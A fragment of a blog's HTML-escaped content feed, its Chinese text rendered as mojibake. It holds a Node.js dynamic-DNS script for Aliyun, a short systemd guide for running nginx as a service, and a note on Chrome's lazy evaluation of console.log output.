class="subst">${month}</span>-<span class="subst">${date}</span>T<span class="subst">${hours}</span>:<span class="subst">${minutes}</span>:<span class="subst">${secounds}</span>Z`</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å­—ç¬¦ä¸²ç¼–ç ï¼ˆé˜¿é‡Œè§„åˆ™ï¼‰</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * è§„åˆ™ï¼š&lt;https://help.aliyun.com/document_detail/29747.html&gt; 1.b</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">str</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">percentEncode</span>(<span class="params">str</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">encodeURIComponent</span>(str).<span class="title function_">replace</span>(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%20&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;%2A&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;%7E&#x27;</span>, <span class="string">&#x27;~&#x27;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HTTPs GET</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> url, timeout = 5000, json = true </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> query è¯·æ±‚å‚æ•°å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> json å¦‚æœä¸ºtrueå¹¶ä¸”content-typeä¸ºapplication/jsonçš„æƒ…å†µä¸‹ä¼šååºåˆ—åŒ–</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> å¦‚æœå“åº”ç ä¸º4xxæˆ–è€…5xxå“åº”ä¼šä½œä¸ºé”™è¯¯æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">{ url: uri, query = {}, timeout = <span class="number">5000</span>, json = <span class="literal">true</span> }</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// åˆå¹¶query</span></span><br><span class="line">        <span class="keyword">const</span> urlObject = url.<span class="title function_">parse</span>(uri, <span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(urlObject.<span class="property">query</span>, query);</span><br><span class="line">        urlObject.<span class="property">search</span> = <span class="literal">null</span>;</span><br><span class="line">        uri = url.<span class="title function_">format</span>(urlObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// support HTTPs</span></span><br><span class="line">        <span class="keyword">let</span> protocol;</span><br><span class="line">        <span class="keyword">if</span> (urlObject.<span class="property">protocol</span> === <span class="string">&#x27;https:&#x27;</span>) protocol = https;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (urlObject.<span class="property">protocol</span> === <span class="string">&#x27;http:&#x27;</span>) protocol = http;</span><br><span class="line">        <span class="keyword">else</span> { <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`unsupported protocol [<span class="subst">${urlObject.protocol}</span>]`</span>) };</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> req = protocol.<span class="title function_">get</span>(uri)</span><br><span class="line">        req.<span class="built_in">setTimeout</span>(timeout);</span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="function">() =&gt;</span> req.<span class="title function_">abort</span>());</span><br><span class="line"></span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;response&#x27;</span>, <span class="function">(<span class="params">res</span>) =&gt;</span> {</span><br><span class="line">            res.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> { statusCode, headers } = res;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> { rawData += chunk; });</span><br><span class="line">            res.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="keyword">let</span> data = rawData;</span><br><span class="line">                <span class="keyword">if</span> (json &amp;&amp; -<span class="number">1</span> !== headers[<span class="string">&#x27;content-type&#x27;</span>].<span class="title function_">indexOf</span>(<span class="string">&#x27;application/json&#x27;</span>)) {</span><br><span class="line">                    data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (statusCode &gt;= <span class="number">400</span>) {</span><br><span class="line">                    <span class="title function_">reject</span>(data);</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="title function_">resolve</span>(data);</span><br><span class="line">                }</span><br><span class="line">            });</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, reject);</span><br><span class="line">    });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">timeout</span>(<span class="params">time</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> {</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;operation timed out&#x27;</span>));</span><br><span class="line">        }, time);</span><br><span class="line">    });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŸ¥è¯¢æœ¬æœºå…¬ç½‘IP</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">findMyIP</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">const</span> rawData = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">race</span>([</span><br><span class="line">        <span class="title function_">request</span>({ <span class="attr">url</span>: <span class="string">&#x27;http://myip.ipip.net&#x27;</span>, <span class="attr">json</span>: <span class="literal">false</span> }),</span><br><span class="line">        <span class="comment">// request({ url: &#x27;http://ipinfo.io&#x27;, json: false }),</span></span><br><span class="line">        <span class="title function_">request</span>({ <span class="attr">url</span>: <span class="string">&#x27;https://api.ipify.org&#x27;</span>, <span class="attr">json</span>: <span class="literal">false</span> })</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> match = rawData.<span class="title function_">match</span>(<span class="regexp">/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/</span>);</span><br><span class="line">    <span class="keyword">if</span> (!match) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`æ— æ³•è§£æIPã€‚<span class="subst">${rawData}</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”Ÿæˆå…¬å…±å‚æ•°</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * å‚è€ƒï¼š&lt;https://help.aliyun.com/document_detail/29745.html&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> accessKeyId, format = &#x27;JSON&#x27;, signatureNonce = Math.random(), timestamp = utcDateFormat(new Date()) </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generatePublicParams</span>(<span class="params">{ accessKeyId, format = <span class="string">&#x27;JSON&#x27;</span>, signatureNonce = <span class="built_in">Math</span>.random(), timestamp = utcDateFormat(<span class="keyword">new</span> <span class="built_in">Date</span>()) }</span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        <span class="string">&#x27;AccessKeyId&#x27;</span>: accessKeyId,</span><br><span class="line">        <span class="string">&#x27;Format&#x27;</span>: format,</span><br><span class="line">        <span class="string">&#x27;Version&#x27;</span>: <span class="string">&#x27;2015-01-09&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SignatureMethod&#x27;</span>: <span class="string">&#x27;HMAC-SHA1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SignatureNonce&#x27;</span>: signatureNonce,</span><br><span class="line">        <span class="string">&#x27;SignatureVersion&#x27;</span>: <span class="string">&#x27;1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Timestamp&#x27;</span>: timestamp</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç­¾å</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * è§„åˆ™ï¼š&lt;https://help.aliyun.com/document_detail/29747.html&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> params, accesskeySecret </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sign</span>(<span class="params">{ params, accesskeySecret }</span>) {</span><br><span class="line">    <span class="keyword">const</span> query = <span class="title class_">Object</span>.<span class="title function_">entries</span>(params)</span><br><span class="line">        .<span class="title function_">sort</span>(<span class="function">(<span class="params">param1, param2</span>) =&gt;</span> <span class="title function_">compareString</span>(param1[<span class="number">0</span>], param2[<span class="number">0</span>]))</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function">(<span class="params">[key, val]</span>) =&gt;</span> [<span class="title function_">percentEncode</span>(key), <span class="title function_">percentEncode</span>(val)])</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function"><span class="params">param</span> =&gt;</span> param.<span class="title function_">join</span>(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">        .<span class="title function_">join</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> stringToSign = <span class="string">&#x27;GET&amp;&#x27;</span> + <span class="title function_">percentEncode</span>(<span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;&amp;&#x27;</span> + <span class="title function_">percentEncode</span>(query);</span><br><span class="line">    <span class="keyword">const</span> signStr = <span class="title function_">sha1</span>(stringToSign, <span class="string">`<span class="subst">${accesskeySecret}</span>&amp;`</span>);</span><br><span class="line">    <span class="keyword">return</span> signStr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¯·æ±‚æ¥å£</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> params, accessKeyId, accesskeySecret </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">callApi</span>(<span class="params">{ params, accessKeyId, accesskeySecret }</span>) {</span><br><span class="line">    <span class="comment">// ç­¾å</span></span><br><span class="line">    <span class="keyword">const</span> signStr = <span class="title function_">sign</span>({ params, accesskeySecret });</span><br><span class="line">    params[<span class="string">&#x27;Signature&#x27;</span>] = signStr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">request</span>({ <span class="attr">url</span>: <span class="string">&#x27;https://alidns.aliyuncs.com/&#x27;</span>, <span class="attr">query</span>: params });</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–è§£æè®°å½•åˆ—è¡¨</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * å‚è€ƒï¼š&lt;https://help.aliyun.com/document_detail/29776.html&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> domainName, rrKeyWord, pageNumber = 1, pageSize = 20, typeKeyWord = &#x27;A&#x27;, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">describeDomainRecords</span>(<span class="params">{ domainName, rrKeyWord, pageNumber = <span class="number">1</span>, pageSize = <span class="number">20</span>, typeKeyWord = <span class="string">&#x27;A&#x27;</span>, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET }</span>) {</span><br><span class="line">    <span class="keyword">const</span> params = {</span><br><span class="line">        <span class="string">&#x27;Action&#x27;</span>: <span class="string">&#x27;DescribeDomainRecords&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DomainName&#x27;</span>: domainName,</span><br><span class="line">        <span class="string">&#x27;PageNumber&#x27;</span>: pageNumber,</span><br><span class="line">        <span class="string">&#x27;PageSize&#x27;</span>: pageSize,</span><br><span class="line">        <span class="string">&#x27;RRKeyWord&#x27;</span>: rrKeyWord,</span><br><span class="line">        <span class="string">&#x27;TypeKeyWord&#x27;</span>: typeKeyWord</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(params, <span class="title function_">generatePublicParams</span>({ accessKeyId }));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> resp = <span class="keyword">await</span> <span class="title function_">callApi</span>({ params, accessKeyId, accesskeySecret });</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¿®æ”¹è§£æè®°å½•</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * å‚è€ƒï¼š&lt;https://help.aliyun.com/document_detail/29774.html&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> recordId, rr, value, type = &#x27;A&#x27;, ttl = 600, line = &#x27;default&#x27;, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ttl åŸºç¡€ç‰ˆæœ€å°600ç§’</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">updateDomainRecord</span>(<span class="params">{ recordId, rr, value, type = <span class="string">&#x27;A&#x27;</span>, ttl = <span class="number">600</span>, line = <span class="string">&#x27;default&#x27;</span>, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET }</span>) {</span><br><span class="line">    <span class="keyword">const</span> params = {</span><br><span class="line">        <span class="string">&#x27;Action&#x27;</span>: <span class="string">&#x27;UpdateDomainRecord&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;RecordId&#x27;</span>: recordId,</span><br><span class="line">        <span class="string">&#x27;RR&#x27;</span>: rr,</span><br><span class="line">        <span class="string">&#x27;Type&#x27;</span>: type,</span><br><span class="line">        <span class="string">&#x27;Value&#x27;</span>: value,</span><br><span class="line">        <span class="string">&#x27;TTL&#x27;</span>: ttl,</span><br><span class="line">        <span class="string">&#x27;Line&#x27;</span>: line</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(params, <span class="title function_">generatePublicParams</span>({ accessKeyId }));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> resp = <span class="keyword">await</span> <span class="title function_">callApi</span>({ params, accessKeyId, accesskeySecret });</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// findMyIP().then(console.log).catch(console.error);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// describeDomainRecords({ domainName: &#x27;kekek.cc&#x27;, rrKeyWord: &#x27;www&#x27; }).then((recoder) =&gt; {</span></span><br><span class="line"><span class="comment">//     console.log(JSON.stringify(recoder, null, 2))</span></span><br><span class="line"><span class="comment">// }).catch(console.error)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// updateDomainRecord({ recordId: &#x27;3535020439014400&#x27;, rr: &#x27;www&#x27;, value: &#x27;202.106.0.21&#x27; }).then(console.log).catch(console.error)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ========================================&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="title function_">async</span> () =&gt; {</span><br><span class="line">    <span class="comment">// è¦æ›´æ–°çš„åŸŸå</span></span><br><span class="line">    <span class="keyword">let</span> records = [];</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        records = <span class="built_in">require</span>(<span class="string">&#x27;./domains.json&#x27;</span>);</span><br><span class="line">    } <span class="keyword">catch</span> (ignored) {</span><br><span class="line">        records = [</span><br><span class="line">            {</span><br><span class="line">                <span class="attr">domainName</span>: <span class="string">&#x27;kekek.cc&#x27;</span>,</span><br><span class="line">                <span class="attr">rrKeyWord</span>: <span class="string">&#x27;www&#x27;</span></span><br><span class="line">            },</span><br><span class="line">            {</span><br><span class="line">                <span class="attr">domainName</span>: <span class="string">&#x27;kekek.cc&#x27;</span>,</span><br><span class="line">                <span class="attr">rrKeyWord</span>: <span class="string">&#x27;@&#x27;</span></span><br><span class="line">            }</span><br><span class="line">        ];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> myip = <span class="keyword">await</span> <span class="title function_">findMyIP</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> record <span class="keyword">of</span> records) {</span><br><span class="line">        <span class="keyword">const</span> recordDetails = <span class="keyword">await</span> <span class="title function_">describeDomainRecords</span>(record);</span><br><span class="line">        <span class="keyword">const</span> recordDetail = recordDetails.<span class="property">DomainRecords</span>.<span class="property">Record</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">_record</span> =&gt;</span> _record.<span class="property">RR</span> === record.<span class="property">rrKeyWord</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recordDetail &amp;&amp; recordDetail[<span class="string">&#x27;Value&#x27;</span>] !== myip) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[update] domainName: %s, rr: %s, before: %s, after: %s&#x27;</span>, record.<span class="property">domainName</span>, record.<span class="property">rrKeyWord</span>, recordDetail[<span class="string">&#x27;Value&#x27;</span>], myip);</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">updateDomainRecord</span>({ <span class="attr">recordId</span>: recordDetail[<span class="string">&#x27;RecordId&#x27;</span>], <span class="attr">rr</span>: record.<span class="property">rrKeyWord</span>, <span class="attr">value</span>: myip, <span class="attr">ttl</span>: record.<span class="property">ttl</span> });</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">})().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>())).<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>)</span><br></pre></td></tr></table></figure><p>ç¼ºé™·ï¼šDNSæ˜¯æœ‰ç¼“å­˜çš„ï¼Œæ›´æ–°äº†æ–°çš„è§£æåä¸èƒ½ç«‹å³ç”Ÿæ•ˆã€‚è¿™æ ·ç½‘ç«™ä¼šåœ¨ä¸€æ®µæ—¶é—´å†…ä¸å¯ç”¨ã€‚</p><blockquote><p>ç¼“å­˜çš„é—®é¢˜å¯ä»¥é€šè¿‡è´­ä¹°DNSvipæœåŠ¡å®ç°æœ€ä½1ç§’çš„ç¼“å­˜ã€‚</p></blockquote><h3 id="è®¾å¤‡"><a href="#è®¾å¤‡" class="headerlink" title="è®¾å¤‡"></a>è®¾å¤‡</h3><p>æ—§ç”µè„‘æˆ–è€…æ ‘è“æ´¾</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Systemd</title>
      <link href="/post/systemd.html"/>
      <url>/post/systemd.html</url>
      
        <content type="html"><![CDATA[<h2 id="Systemd"><a href="#Systemd" class="headerlink" title="Systemd"></a>Systemd</h2><h3 id="åˆ›å»ºæœåŠ¡"><a href="#åˆ›å»ºæœåŠ¡" class="headerlink" title="åˆ›å»ºæœåŠ¡"></a>åˆ›å»ºæœåŠ¡</h3><p>vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;nginx.service</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=The NGINX HTTP and reverse proxy server</span><br><span class="line">After=syslog.target network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/var/run/nginx.pid</span><br><span class="line">ExecStartPre=/usr/sbin/nginx -t</span><br><span class="line">ExecStart=/usr/sbin/nginx</span><br><span class="line">ExecReload=/usr/sbin/nginx -s reload</span><br><span class="line">ExecStop=/bin/kill -s QUIT $MAINPID</span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><h3 id="åˆå§‹åŒ–æ—¶è‡ªåŠ¨å¯åŠ¨æœåŠ¡"><a href="#åˆå§‹åŒ–æ—¶è‡ªåŠ¨å¯åŠ¨æœåŠ¡" class="headerlink" title="åˆå§‹åŒ–æ—¶è‡ªåŠ¨å¯åŠ¨æœåŠ¡"></a>åˆå§‹åŒ–æ—¶è‡ªåŠ¨å¯åŠ¨æœåŠ¡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /lib/systemd/system/nginx.service  /etc/systemd/system/multi-user.target.wants/nginx.service</span><br></pre></td></tr></table></figure><p>æˆ–è€… </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable nginx</span><br></pre></td></tr></table></figure><h3 id="åˆ·æ–°é…ç½®"><a href="#åˆ·æ–°é…ç½®" class="headerlink" title="åˆ·æ–°é…ç½®"></a>åˆ·æ–°é…ç½®</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨ã€é‡å¯ã€åœæ­¢"><a href="#å¯åŠ¨ã€é‡å¯ã€åœæ­¢" class="headerlink" title="å¯åŠ¨ã€é‡å¯ã€åœæ­¢"></a>å¯åŠ¨ã€é‡å¯ã€åœæ­¢</h3><ol><li><p>å¯åŠ¨nginx</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl start nginx</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯nginx</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart nginx</span><br></pre></td></tr></table></figure></li><li><p>åœæ­¢nginx</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl stop nginx</span><br></pre></td></tr></table></figure></li></ol><h3 id="å¼€æœºå¯åŠ¨"><a href="#å¼€æœºå¯åŠ¨" class="headerlink" title="å¼€æœºå¯åŠ¨"></a>å¼€æœºå¯åŠ¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable nginx</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹çŠ¶æ€"><a href="#æŸ¥çœ‹çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹çŠ¶æ€"></a>æŸ¥çœ‹çŠ¶æ€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://blog.csdn.net/chwshuang/article/details/68489968">systemctlç®¡ç†Rediså¯åŠ¨ã€åœæ­¢ã€å¼€æœºå¯åŠ¨</a></li><li><a href="https://www.nginx.com/resources/wiki/start/topics/examples/systemd/">NGINX systemd service file</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> systemctl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>console.logçš„å»¶è¿Ÿè®¡ç®—</title>
      <link href="/post/lazy-evaluation-of-console-log.html"/>
      <url>/post/lazy-evaluation-of-console-log.html</url>
      
        <content type="html"><![CDATA[<h2 id="console-logçš„å»¶è¿Ÿè®¡ç®—"><a href="#console-logçš„å»¶è¿Ÿè®¡ç®—" class="headerlink" title="console.logçš„å»¶è¿Ÿè®¡ç®—"></a>console.logçš„å»¶è¿Ÿè®¡ç®—</h2><p>æˆ‘ä»¬è°ƒè¯•JavaScriptæ—¶ç»å¸¸ä¼šç”¨åˆ°<code>console.log</code>æ‰“å°ï¼Œä½†æ˜¯<code>console.log</code>æ‰“å°å¯¹è±¡æ—¶ä¸é‚£ä¹ˆå‡†ç¡®ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123; <span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">user.<span class="property">name</span> = <span class="string">&#x27;Lee&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/console-log-lazy-evaluation.jpeg"></p><p><code>user.name</code>çš„åˆå§‹å€¼ä¸º<code>Ming</code>ï¼Œæ‰“å°<code>user</code>çœ‹åˆ°çš„<code>name</code>å€¼ä¹Ÿæ˜¯<code>Ming</code>ã€‚ç´§æ¥ç€ä¿®æ”¹<code>user.name</code>å€¼ä¸º<code>Lee</code>ï¼Œç„¶åå†æš‚å¼€å‰é¢æ‰“å°<code>user</code>å¯¹è±¡å°±çœ‹åˆ°<code>name</code>å€¼å˜æˆäº†<code>Lee</code>ã€‚</p><p>è¿™ä¸ªå±•å¼€çœ‹åˆ°çš„å€¼æ˜¯Chromeä¸ºäº†ä¼˜åŒ–<code>console.log</code>è¿›è¡Œçš„å»¶è¿Ÿè®¡ç®—ï¼Œæˆ‘ä»¬çœ‹åˆ°å¯¹è±¡å±•å¼€åçš„å€¼æ˜¯åœ¨å±•å¼€æ—¶å®æ—¶è®¡ç®—çš„ã€‚å¦‚æœç•™æ„åœ¨å±•å¼€å¯¹è±¡æ—¶ä¼šæœ‰ä¸€ä¸ªæç¤º<code>Value below was evaluated just now.</code>ã€‚</p><p>ä¸ºäº†é¿å…ä¸Šè¿°é—®é¢˜åœ¨æ‰“å°å¯¹è±¡æ—¶å¯ä»¥å°†å¯¹è±¡åºåˆ—åŒ–ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user, <span class="literal">null</span>, <span class="number">2</span>)); <span class="comment">// æ ¼å¼åŒ–</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
